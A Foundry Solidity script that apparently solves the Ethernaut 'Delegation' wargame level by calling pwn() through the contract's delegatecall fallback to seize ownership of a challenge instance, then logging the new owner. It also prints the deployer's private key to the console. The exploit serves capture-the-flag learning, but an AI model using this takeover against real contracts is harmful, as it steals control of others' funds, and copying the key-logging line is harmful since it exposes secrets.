// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { Delegation } from "../src/06_Delegation.sol";

contract DelegationAttacker is Script {

  address challengeInstanceAddress = 0x30BF7DD2633A0c81C4EE0ab717bE3114cDd818B1;
  Delegation challenge = Delegation(challengeInstanceAddress);
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    vm.startBroadcast(deployerPrivateKey);
    console.log("deployerPrivateKey: %s", deployerPrivateKey);
    console.log("msg sender: %s", msg.sender);
    (bool success, ) = address(challenge).call(abi.encodeWithSignature("pwn()"));
    require(success, "pwn call failed");
    console.log("challenge.owner(): %s", challenge.owner());
    vm.stopBroadcast();
  }

}